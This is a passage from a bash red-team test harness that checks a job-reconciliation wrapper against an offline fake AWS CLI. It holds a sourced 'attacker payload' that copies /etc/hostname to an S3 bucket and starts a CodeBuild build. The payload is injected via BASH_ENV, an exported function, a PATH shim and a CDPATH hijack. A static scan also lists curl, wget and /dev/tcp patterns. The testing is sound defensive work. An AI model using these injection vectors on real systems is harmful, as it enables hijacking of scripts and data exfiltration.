  row $id b "not job_completed; reconcile refused (7)" "$(W); reconcile rc=$R_RC pass=$R_PASS" "$([[ $W_CLASS != job_completed && $R_PASS != true ]] && echo holds || echo BREAK)"
  prune $id
done
# B12 rule (a): exit_code as a string passes the wrapper's string comparison
for v in 'B12a-ruleA-exit-string-0|0|SUCCEEDED|"0"' 'B12b-ruleA-exit-string-42|26|FAILED|"42"'; do
  IFS='|' read -r id lrc bs ex <<<"$v"
  mk_case_a $id "$JOB2" "$REQ2" "s3://$BUCKET/runs/$JOB2/$POD/" "$POD" "$lrc" "$bs" "$([[ $lrc == 0 ]] && echo succeeded || echo failed)"
  mk_jobset "$OUT/cases/$id/fx/s3/runs/$JOB2/$POD" "$JOB2" "$POD" "$ex" "$REQ2"
  run_wrapper $id "$REQ2"; run_cj $id "$REQ2"
  row $id b "not job_completed (exit_code is not an integer)" "$(W); check_job=$CJ_LAST" "$([[ $W_CLASS == job_completed ]] && echo BREAK-wrapper || echo holds)"
  prune $id
done
# B13 pairing matrix on rule (b) (job-exit = container exit = E)
for v in 26:FAILED:42 26:FAILED:43 26:FAILED:0 0:SUCCEEDED:42 0:FAILED:42 26:SUCCEEDED:42 26:NONE:42 25:FAILED:42 1:FAILED:42 26:TIMED_OUT:42 0:SUCCEEDED:0 26:STOPPED:42; do
  IFS=: read -r lrc bs e <<<"$v"; id="B13-pair-${lrc}-${bs}-${e}"
  mk_case_b $id "$JOB1" "$REQ1" "je_exit=$e" "cexit=$e" "launch_rc=$lrc" "bstatus=$bs"
  run_wrapper $id "$REQ1"
  want=other; [[ $v == 26:FAILED:42 || $v == 26:FAILED:43 ]] && want=job_completed; [[ $bs == TIMED_OUT ]] && want=deadline_hit
  row $id b "class $want" "$(W)" "$([[ $W_CLASS == "$want" ]] && echo holds || { [[ $W_CLASS == job_completed ]] && echo NOTE-odd-pairing-accepted || echo differs; })"
  prune $id
done
# B14 partial download (aws exit 1): (i) a listed file lost; (ii) an unlisted object lost
for v in "B14a-partial-listed-lost|session/records.jsonl|0" "B14b-partial-unlisted-lost|stray.bin|1"; do
  IFS='|' read -r id drop extra <<<"$v"
  mk_case_b $id "$JOB1" "$REQ1"; pd="$OUT/cases/$id/fx/s3/runs/$JOB1/$POD"
  [[ $extra == 1 ]] && head -c 64 /dev/zero > "$pd/stray.bin"   # an object in the prefix that SHA256SUMS does not list
  export RT_MODE=partial RT_DROP=$drop
  run_wrapper $id "$REQ1" "$WRAP_PATH"; run_cj $id "$REQ1"
  run_reconcile $id "" "$WRAP_PATH"
  unset RT_MODE RT_DROP
  row $id b "not job_completed when the download exit is nonzero" "$(W); check_job=$CJ_LAST; reconcile rc=$R_RC pass=$R_PASS" \
    "$([[ $W_CLASS == job_completed ]] && { [[ $CJ_LAST == CHECK_JOB_OK ]] && echo BREAK-wrapper+check_job || echo BREAK-wrapper-only; } || echo holds)"
  prune $id
done
# B15 non-JSON launcher files after the submission
for v in "B15a-result-not-json|result" "B15b-build-not-json|build" "B15c-result-array|resultarray"; do
  id=${v%%|*}; m=${v#*|}; mk_case_b $id "$JOB1" "$REQ1"
  case $m in result) echo 'not json' > "$OUT/cases/$id/fx/launcher/result.json" ;; build) echo 'not json' > "$OUT/cases/$id/fx/launcher/build.json" ;;
             resultarray) echo '[1]' > "$OUT/cases/$id/fx/launcher/result.json" ;; esac
  run_wrapper $id "$REQ1"
  row $id b "not job_completed; a raw-result.json with submitted:true" "$(W)" "$([[ $W_CLASS == job_completed ]] && echo BREAK || { [[ $W_RAW == absent ]] && echo NOTE-crash || echo holds; })"
  prune $id
done

# ================================================================ (c) can reconcile_run.sh submit or write
ATT="$OUT/attacker"; mkdir -p "$ATT"
cat > "$ATT/payload.sh" <<'PAY'
# attacker payload (sourced). It acts only when the PATH aws is the offline fake, and at most once per process tree.
# Its two calls are an S3 write and a CodeBuild start-build; the fake refuses the first (exit 99), rejects the second as
# unsupported (exit 97), and logs both. No real AWS endpoint can be reached from here.
if [[ -z ${RT_IN_PAYLOAD:-} ]]; then
  case "$(readlink -f "$(type -P aws)")" in
    */implementation/tests/fake-aws|*/fixtures/isobin-wrap/aws)
      export RT_IN_PAYLOAD=1
      echo "RT-PAYLOAD ran via ${RT_VECTOR:-?} in pid $$" >> "${RT_MARK:?}"
      command aws s3 cp /etc/hostname "s3://rt-9d2b6a-no-such-bucket/payload-${RT_VECTOR:-x}" >/dev/null 2>&1
      command aws codebuild start-build --project-name rt-9d2b6a-no-such-project >/dev/null 2>&1 ;;
  esac
fi
PAY
mk_case_b C00-base "$JOB1" "$REQ1"
cvec() { # cvec ID VECTOR : report one environment vector
  local id=$1 vec=$2
  local marks wr; marks=$(grep -c RT-PAYLOAD "$OUT/cases/$id/mark.txt" 2>/dev/null); marks=${marks:-0}
  wr=$(grep -c -E '^aws s3 cp [^ ]+ s3://|^aws codebuild start-build' "$R_DIR/aws.log" 2>/dev/null); wr=${wr:-0}
  row $id c "reconcile issues only s3 cp (from S3) and s3 ls" "vector=$vec payload_runs=$marks write_or_submit_calls_reaching_aws=$wr reconcile rc=$R_RC pass=$R_PASS" \
    "$([[ $wr -gt 0 ]] && echo BREAK-env || echo holds)"
}
for vec in BASH_ENV EXPORTED_FUNCTION PATH_SHIM; do
  id="C01-$vec"; rm -rf "$OUT/cases/$id"; mkdir -p "$OUT/cases/$id"; cp -r "$OUT/cases/C00-base/fx" "$OUT/cases/$id/fx"; : > "$OUT/cases/$id/mark.txt"
  case $vec in
    BASH_ENV) run_reconcile $id "" "$ISO_PATH" BASH_ENV="$ATT/payload.sh" RT_VECTOR=BASH_ENV RT_MARK="$OUT/cases/$id/mark.txt" ;;
    EXPORTED_FUNCTION) run_reconcile $id "" "$ISO_PATH" "BASH_FUNC_aws%%=() { RT_VECTOR=exported-function; . $ATT/payload.sh; command aws \"\$@\"; }" RT_MARK="$OUT/cases/$id/mark.txt" ;;
    PATH_SHIM) mkdir -p "$ATT/shim"; printf '#!/bin/bash\nRT_VECTOR=PATH-python3 . %s\nexec /usr/bin/python3 "$@"\n' "$ATT/payload.sh" > "$ATT/shim/python3"; chmod +x "$ATT/shim/python3"
               run_reconcile $id "" "$ATT/shim:$ISO_PATH" RT_MARK="$OUT/cases/$id/mark.txt" ;;
  esac
  cvec $id $vec; prune $id
done
# C02 CDPATH + the runbook's relative argv path: `here=$(cd "$(dirname ...)" && pwd)` resolves to an attacker directory
id=C02-CDPATH-relative-argv; rm -rf "$OUT/cases/$id"; mkdir -p "$OUT/cases/$id"; cp -r "$OUT/cases/C00-base/fx" "$OUT/cases/$id/fx"; : > "$OUT/cases/$id/mark.txt"
CDA=$(mktemp -d "${TMPDIR:-/tmp}/rt-9d2b6a-cdpath.XXXXXX")
rel=experiments/EXP-ICPERF-127dbd/implementation
mkdir -p "$CDA/$rel"
hij="$CDA/$rel"$'\n'"$CDA/$rel"                          # the value `here` takes: two lines, both the attacker path
mkdir -p "$hij"
printf '#!/bin/bash\nRT_VECTOR=CDPATH . %s\nexec bash %s "$@"\n' "$ATT/payload.sh" "$IMPL/locate_results.sh" > "$hij/locate_results.sh"; chmod +x "$hij/locate_results.sh"
w="$OUT/cases/$id/rec"; mkdir -p "$w/s3root" "$w/state"; cp -r "$OUT/cases/$id/fx/s3/." "$w/s3root/"; : > "$w/aws.log"
( cd "$WT" && env PATH="$ISO_PATH" FAKE_AWS_LOG="$w/aws.log" FAKE_S3_ROOT="$w/s3root" ISOLAB_BUCKET="$BUCKET" CDPATH="$CDA" RT_MARK="$OUT/cases/$id/mark.txt" \
  bash "$rel/reconcile_run.sh" --launcher-result "$OUT/cases/$id/fx/launcher/result.json" \
  --launcher-result-sha256 "$(sha256sum "$OUT/cases/$id/fx/launcher/result.json" | cut -d ' ' -f1)" --request "$REQ1" \
  --check-job "$CHECKJOB" --run-id RUN-ICPERF-8b0d47 --trial-id T1 --out "$w/out" > "$w/stdout" 2> "$w/stderr" ); R_RC=$?; R_DIR=$w
R_PASS=$(jq -r '.reconcile_pass | tostring' "$w/out/reconcile-result.json" 2>/dev/null || echo absent)
printf '%q\n' "$hij/locate_results.sh" | sed "s|$CDA|<CDPATH-dir>|g" > "$OUT/cases/$id/hijack-path.txt"
cvec $id "CDPATH(relative argv as in runbook S02)"; prune $id; rm -rf "$CDA"
# C02b CDPATH=. (harmless-looking) with the relative argv: `here` gets two lines and the locator is not found
id=C02b-CDPATH-dot; rm -rf "$OUT/cases/$id"; mkdir -p "$OUT/cases/$id"; cp -r "$OUT/cases/C00-base/fx" "$OUT/cases/$id/fx"
w="$OUT/cases/$id/rec"; mkdir -p "$w/s3root"; cp -r "$OUT/cases/$id/fx/s3/." "$w/s3root/"; : > "$w/aws.log"
( cd "$WT" && env PATH="$ISO_PATH" FAKE_AWS_LOG="$w/aws.log" FAKE_S3_ROOT="$w/s3root" ISOLAB_BUCKET="$BUCKET" CDPATH=. \
  bash "$rel/reconcile_run.sh" --launcher-result "$OUT/cases/$id/fx/launcher/result.json" \
  --launcher-result-sha256 "$(sha256sum "$OUT/cases/$id/fx/launcher/result.json" | cut -d ' ' -f1)" --request "$REQ1" \
  --check-job "$CHECKJOB" --run-id RUN-ICPERF-8b0d47 --trial-id T1 --out "$w/out" > "$w/stdout" 2> "$w/stderr" ); R_RC=$?
row $id c "robustness: an exported CDPATH should not change the result" "reconcile rc=$R_RC; $(grep -m1 -o 'No such file or directory' "$w/stderr" || echo -)" "$([[ $R_RC == 0 ]] && echo holds || echo NOTE-fails-closed)"
prune $id
# C03 ISOLAB_BUCKET override (attacker bucket): must fail before any AWS call
id=C03-ISOLAB_BUCKET-override; rm -rf "$OUT/cases/$id"; mkdir -p "$OUT/cases/$id"; cp -r "$OUT/cases/C00-base/fx" "$OUT/cases/$id/fx"
BUCKET_SAVE=$BUCKET; BUCKET=rt-9d2b6a-elsewhere; run_reconcile $id "" "$ISO_PATH"; BUCKET=$BUCKET_SAVE
row $id c "refused with zero AWS calls" "reconcile rc=$R_RC pass=$R_PASS aws_calls=$(grep -c . "$R_DIR/aws.log")" "$([[ $R_PASS != true ]] && echo holds || echo BREAK)"
prune $id
# C04 --out through a symlink into a runs/ directory (lexical check only)
id=C04-out-symlink-into-runs; rm -rf "$OUT/cases/$id"; mkdir -p "$OUT/cases/$id/fakerepo/runs/RUN-X/job/empty"; cp -r "$OUT/cases/C00-base/fx" "$OUT/cases/$id/fx"
ln -s "$OUT/cases/$id/fakerepo/runs/RUN-X/job/empty" "$OUT/cases/$id/outlink"
w="$OUT/cases/$id/rec"; mkdir -p "$w/s3root"; cp -r "$OUT/cases/$id/fx/s3/." "$w/s3root/"; : > "$w/aws.log"
env PATH="$ISO_PATH" FAKE_AWS_LOG="$w/aws.log" FAKE_S3_ROOT="$w/s3root" ISOLAB_BUCKET="$BUCKET" bash "$IMPL/reconcile_run.sh" \
  --launcher-result "$OUT/cases/$id/fx/launcher/result.json" --launcher-result-sha256 "$(sha256sum "$OUT/cases/$id/fx/launcher/result.json" | cut -d ' ' -f1)" \
  --request "$REQ1" --check-job "$CHECKJOB" --run-id RUN-ICPERF-8b0d47 --trial-id T1 --out "$OUT/cases/$id/outlink" > "$w/stdout" 2> "$w/stderr"; R_RC=$?
n_in_runs=$(find "$OUT/cases/$id/fakerepo/runs" -type f | wc -l)
row $id c "refuse an --out that resolves inside runs/" "reconcile rc=$R_RC files written under fakerepo/runs=$n_in_runs" "$([[ $n_in_runs -gt 0 ]] && echo NOTE-lexical-only || echo holds)"
find "$OUT/cases/$id/fakerepo/runs" -type f -path '*/artifacts/*' -delete; prune $id
# C05 static scan of the two reconcile-path scripts
{
  echo "# C05 static scan (reviewer's own patterns)"
  for f in reconcile_run.sh locate_results.sh; do
    echo "== $f"
    echo "-- submit/write tokens (case-insensitive): $(grep -n -i -E 'launch-remote|codebuild|start-build|batch-get|s3api|put-object|delete-object|copy-object|s3 (rm|mv|sync|mb|rb|presign|website)|kubectl|isolab-eks-mcp|aws eks|aws sts|aws iam|curl|wget|/dev/tcp' "$IMPL/$f" | grep -v -E '^[0-9]+:[[:space:]]*#' | wc -l) non-comment lines"
    grep -n -i -E 'launch-remote|codebuild|start-build|batch-get|s3api|put-object|kubectl|isolab-eks-mcp|curl|wget|/dev/tcp' "$IMPL/$f" | sed 's/^/   /'
    echo "-- source / eval / exec of a variable: $(grep -n -E '(^|[;&|[:space:]])(source|eval|exec)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^ ]' "$IMPL/$f" | grep -v -E '^[0-9]+:[[:space:]]*#' | wc -l)"
    echo "-- test hooks (FAKE_/RT_/TEST/DEBUG/HOOK env names): $(grep -n -E 'FAKE_|RT_|TEST|DEBUG|HOOK' "$IMPL/$f" | grep -v -E '^[0-9]+:[[:space:]]*#' | wc -l)"
    echo "-- environment variables read: $(grep -o -E '\$\{?[A-Z][A-Z0-9_]+' "$IMPL/$f" | tr -d '${' | LC_ALL=C sort -u | tr '\n' ' ')"
    echo "-- PATH-resolved commands used: $(grep -v '^[[:space:]]*#' "$IMPL/$f" | grep -o -w -E 'aws|jq|sha256sum|cut|awk|sort|tr|find|wc|stat|ls|mkdir|rm|cat|tail|python3|dirname|env|printf|echo' | LC_ALL=C sort -u | tr '\n' ' ')"
    echo "-- set -x / trap / PATH assignment / umask: $(grep -n -E 'set -x|trap |PATH=|umask' "$IMPL/$f" | grep -v -E '^[0-9]+:[[:space:]]*#' | tr '\n' ' ')"
  done
  echo "-- shebang of locate_results.sh (resolved through PATH when executed as \$here/locate_results.sh): $(head -1 "$IMPL/locate_results.sh")"
} > "$OUT/C05-static-scan.txt"
row C05-static-scan c "no submit/write token in the bytes" "$(grep -c -- '-- submit/write tokens (case-insensitive): 0 ' "$OUT/C05-static-scan.txt")/2 scripts clean; details C05-static-scan.txt" holds
rm -rf "$OUT/cases/C00-base"

echo "== summary: $(awk -F'\t' 'NR>1 {print $5}' "$TABLE" | sed 's/[(/].*//' | LC_ALL=C sort | uniq -c | tr '\n' ';')" | tee "$OUT/rt-summary.txt"
